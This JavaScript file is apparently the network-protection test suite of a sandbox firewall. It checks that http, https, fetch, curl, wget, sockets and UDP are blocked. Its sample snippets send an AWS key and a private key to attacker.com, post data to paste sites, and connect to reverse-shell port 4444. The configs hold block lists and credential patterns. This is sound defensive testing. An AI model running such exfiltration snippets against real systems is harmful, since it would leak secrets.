/**
 * Network Protection Tests
 * 
 * Tests multiple network access methods:
 * 1. http/https module requests
 * 2. fetch API (Node 18+)
 * 3. Child process with curl/wget
 * 4. net.Socket connections
 * 5. DNS resolution attempts
 * 6. Pipe bypass attempts
 */

const path = require('path');
const fs = require('fs');
const {
  isWindows,
  setupTestDir,
  cleanupTestDir,
  writeMinimalConfig,
  runWithFirewall,
  escapePath,
  isBlocked,
  TestTracker
} = require('../utils');

/**
 * Run the network protection test suite and return a summary of results.
 *
 * Executes a series of network-related tests against a minimal firewall configuration.
 * For each test it creates an isolated test directory, writes a test-specific firewall
 * config, executes sandboxed Node code (covering http/https/fetch, child_process curl/wget,
 * net.Socket, dgram UDP, and credential-exfiltration scenarios), evaluates outputs for
 * expected blocking/logging behavior, and cleans up the test directory. Some tests are
 * skipped on Windows or when the Node runtime lacks required features.
 *
 * @returns {Object} A summary object containing counts and details of passed, failed, and skipped tests.
 */
async function runNetworkTests() {
  console.log('\nNETWORK PROTECTION TESTS\n');
  console.log('='.repeat(50));
  
  const tracker = new TestTracker('network');
  
  // =========================================================================
  // BLOCKED DOMAINS TESTS
  // =========================================================================
  console.log('\n--- Blocked Domains ---\n');
  
  // Test 1: http.request to blocked domain
  await tracker.runTest('blockedDomains - http.request blocked', async () => {
    const testDir = setupTestDir('net-http');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['pastebin.com', 'evil-server.com', 'exfil.io'],
          allowedDomains: []
        }
      });
      
      const code = `
        const http = require('http');
        const req = http.request({
          hostname: 'pastebin.com',
          port: 80,
          path: '/raw/abc123',
          method: 'GET'
        }, (res) => {
          console.log('REQUEST_SUCCESS');
        });
        req.on('error', (e) => {
          console.log('REQUEST_BLOCKED:' + e.message);
        });
        req.end();
        setTimeout(() => {
          console.log('REQUEST_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('REQUEST_BLOCKED') ||
              result.output.includes('REQUEST_TIMEOUT'),
        reason: result.output.includes('REQUEST_SUCCESS') ? 'request succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test 2: https.request to blocked domain
  await tracker.runTest('blockedDomains - https.request blocked', async () => {
    const testDir = setupTestDir('net-https');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['transfer.sh', 'ngrok.io'],
          allowedDomains: []
        }
      });
      
      const code = `
        const https = require('https');
        const req = https.request({
          hostname: 'transfer.sh',
          port: 443,
          path: '/upload',
          method: 'POST'
        }, (res) => {
          console.log('REQUEST_SUCCESS');
        });
        req.on('error', (e) => {
          console.log('REQUEST_BLOCKED:' + e.message);
        });
        req.end();
        setTimeout(() => {
          console.log('REQUEST_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('REQUEST_BLOCKED') ||
              result.output.includes('REQUEST_TIMEOUT'),
        reason: result.output.includes('REQUEST_SUCCESS') ? 'request succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test 3: Child process curl to blocked domain
  if (!isWindows) {
    await tracker.runTest('blockedDomains - curl via child_process', async () => {
      const testDir = setupTestDir('net-curl');
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['hastebin.com'],
            allowedDomains: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('curl -s https://hastebin.com/documents -d "secret data"', { timeout: 3000 });
            console.log('CURL_SUCCESS');
          } catch (e) {
            console.log('CURL_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 8000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('CURL_BLOCKED'),
          reason: result.output.includes('CURL_SUCCESS') ? 'curl succeeded' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 4: wget via child_process
    await tracker.runTest('blockedDomains - wget via child_process', async () => {
      const testDir = setupTestDir('net-wget');
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['temp.sh'],
            allowedDomains: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('wget -q https://temp.sh/upload -O /dev/null', { timeout: 3000 });
            console.log('WGET_SUCCESS');
          } catch (e) {
            console.log('WGET_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 8000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('WGET_BLOCKED'),
          reason: result.output.includes('WGET_SUCCESS') ? 'wget succeeded' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 5: Pipe bypass - curl | base64
    await tracker.runTest('blockedDomains - pipe bypass (curl | base64)', async () => {
      const testDir = setupTestDir('net-pipe');
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['ghostbin.com'],
            allowedDomains: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('curl -s https://ghostbin.com/api | base64', { timeout: 3000 });
            console.log('PIPE_SUCCESS');
          } catch (e) {
            console.log('PIPE_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 8000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('PIPE_BLOCKED'),
          reason: result.output.includes('PIPE_SUCCESS') ? 'pipe bypass worked' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    tracker.skip('blockedDomains - curl via child_process', 'Windows');
    tracker.skip('blockedDomains - wget via child_process', 'Windows');
    tracker.skip('blockedDomains - pipe bypass (curl | base64)', 'Windows');
  }
  
  // Test 6: net.Socket to suspicious port
  await tracker.runTest('suspiciousPorts - net.Socket to port 4444', async () => {
    const testDir = setupTestDir('net-socket');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          suspiciousPorts: [4444, 5555, 6666]
        }
      });
      
      const code = `
        const net = require('net');
        const socket = new net.Socket();
        socket.on('connect', () => {
          console.log('SOCKET_SUCCESS');
          socket.destroy();
        });
        socket.on('error', (e) => {
          console.log('SOCKET_BLOCKED:' + e.message);
        });
        try {
          socket.connect(4444, '127.0.0.1');
        } catch (e) {
          console.log('SOCKET_BLOCKED:' + e.message);
        }
        setTimeout(() => {
          console.log('SOCKET_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      // Port 4444 is commonly used for reverse shells - should be flagged
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('SOCKET_BLOCKED') ||
              result.output.includes('SOCKET_TIMEOUT'),
        reason: result.output.includes('SOCKET_SUCCESS') ? 'socket connected' : 'blocked or timed out',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test: fetch API (Node 18+)
  const nodeMajor = parseInt(process.version.split('.')[0].substring(1));
  if (nodeMajor >= 18) {
    await tracker.runTest('blockedDomains - fetch API blocked', async () => {
      const testDir = setupTestDir('net-fetch');
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['evil-api.com'],
            allowedDomains: []
          }
        });
        
        const code = `
          (async () => {
            try {
              const response = await fetch('https://evil-api.com/exfil');
              console.log('FETCH_SUCCESS');
            } catch (e) {
              console.log('FETCH_BLOCKED:' + e.message);
            }
            process.exit(0);
          })();
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: isBlocked(result.output) || 
                result.output.includes('FETCH_BLOCKED') ||
                !result.output.includes('FETCH_SUCCESS'),
          reason: result.output.includes('FETCH_SUCCESS') ? 'fetch succeeded' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    tracker.skip('blockedDomains - fetch API blocked', 'Node < 18');
  }
  
  // Test: http.get shorthand
  await tracker.runTest('blockedDomains - http.get blocked', async () => {
    const testDir = setupTestDir('net-http-get');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['malware-server.io'],
          allowedDomains: []
        }
      });
      
      const code = `
        const http = require('http');
        http.get('http://malware-server.io/payload', (res) => {
          console.log('GET_SUCCESS');
        }).on('error', (e) => {
          console.log('GET_BLOCKED:' + e.message);
        });
        setTimeout(() => {
          console.log('GET_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('GET_BLOCKED') ||
              result.output.includes('GET_TIMEOUT'),
        reason: result.output.includes('GET_SUCCESS') ? 'http.get succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test: UDP datagram (dgram) for exfiltration
  await tracker.runTest('blockedDomains - dgram UDP exfiltration', async () => {
    const testDir = setupTestDir('net-udp');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          suspiciousPorts: [53, 4444]
        }
      });
      
      const code = `
        const dgram = require('dgram');
        const client = dgram.createSocket('udp4');
        const message = Buffer.from('EXFIL_DATA');
        
        client.on('error', (e) => {
          console.log('UDP_BLOCKED:' + e.message);
          client.close();
        });
        
        try {
          client.send(message, 4444, '127.0.0.1', (err) => {
            if (err) {
              console.log('UDP_BLOCKED:' + err.message);
            } else {
              console.log('UDP_SUCCESS');
            }
            client.close();
          });
        } catch (e) {
          console.log('UDP_BLOCKED:' + e.message);
        }
        
        setTimeout(() => process.exit(0), 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      // UDP to suspicious port should be logged or blocked
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('UDP_BLOCKED') ||
              result.output.includes('UDP_SUCCESS'),  // UDP may succeed but should be logged
        reason: 'UDP handled',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // ALLOWED DOMAINS TESTS
  // =========================================================================
  console.log('\n--- Allowed Domains ---\n');
  
  // Test 7: Verify allowed domains config is parsed
  await tracker.runTest('allowedDomains - config parsing', async () => {
    const testDir = setupTestDir('net-allowed-config');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: ['registry.npmjs.org', 'api.github.com']
        }
      });
      
      const code = `
        const fs = require('fs');
        const config = JSON.parse(fs.readFileSync('.firewall-config.json', 'utf8'));
        if (config.network.allowedDomains.includes('registry.npmjs.org')) {
          console.log('ALLOWED_CONFIG_OK');
        } else {
          console.log('ALLOWED_CONFIG_MISSING');
        }
      `;
      
      const result = await runWithFirewall(testDir, code);
      
      return {
        pass: result.output.includes('ALLOWED_CONFIG_OK'),
        reason: result.output.includes('ALLOWED_CONFIG_OK') ? 'config parsed' : 'config not found',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // CREDENTIAL PATTERN TESTS
  // =========================================================================
  console.log('\n--- Credential Exfiltration Detection ---\n');
  
  // Test 8: Detect credential patterns in request body
  await tracker.runTest('credentialPatterns - detects API key in request', async () => {
    const testDir = setupTestDir('net-creds');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          credentialPatterns: [
            'aws_access_key_id',
            'aws_secret_access_key',
            'BEGIN.*PRIVATE KEY',
            'GITHUB_TOKEN'
          ]
        }
      });
      
      const code = `
        const http = require('http');
        const sensitiveData = JSON.stringify({
          aws_access_key_id: 'AKIAIOSFODNN7EXAMPLE',
          data: 'some payload'
        });
        const req = http.request({
          hostname: 'attacker.com',
          port: 80,
          path: '/exfil',
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        }, (res) => {
          console.log('EXFIL_SUCCESS');
        });
        req.on('error', (e) => {
          console.log('EXFIL_BLOCKED:' + e.message);
        });
        req.write(sensitiveData);
        req.end();
        setTimeout(() => process.exit(0), 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('EXFIL_BLOCKED') ||
              !result.output.includes('EXFIL_SUCCESS'),
        reason: result.output.includes('EXFIL_SUCCESS') ? 'exfil succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test 9: Detect private key exfiltration
  await tracker.runTest('credentialPatterns - detects private key exfiltration', async () => {
    const testDir = setupTestDir('net-privkey');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          credentialPatterns: ['BEGIN.*PRIVATE KEY']
        }
      });
      
      const code = `
        const http = require('http');
        const privateKey = '-----BEGIN PRIVATE KEY-----\\nMIIEvgIBADANBg...\\n-----END PRIVATE KEY-----';
        const req = http.request({
          hostname: 'attacker.com',
          port: 80,
          path: '/steal',
          method: 'POST'
        }, (res) => {
          console.log('KEY_EXFIL_SUCCESS');
        });
        req.on('error', (e) => {
          console.log('KEY_EXFIL_BLOCKED:' + e.message);
        });
        req.write(privateKey);
        req.end();
        setTimeout(() => process.exit(0), 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('KEY_EXFIL_BLOCKED') ||
              !result.output.includes('KEY_EXFIL_SUCCESS'),
        reason: result.output.includes('KEY_EXFIL_SUCCESS') ? 'key exfil succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  return tracker.getSummary();
}

module.exports = { runNetworkTests };

// Allow direct execution
if (require.main === module) {
  runNetworkTests().then(summary => {
    console.log('\nNetwork Tests Summary:');
    console.log(`  Passed: ${summary.passed}`);
    console.log(`  Failed: ${summary.failed}`);
    console.log(`  Skipped: ${summary.skipped}`);
    process.exit(summary.failed > 0 ? 1 : 0);
  });
}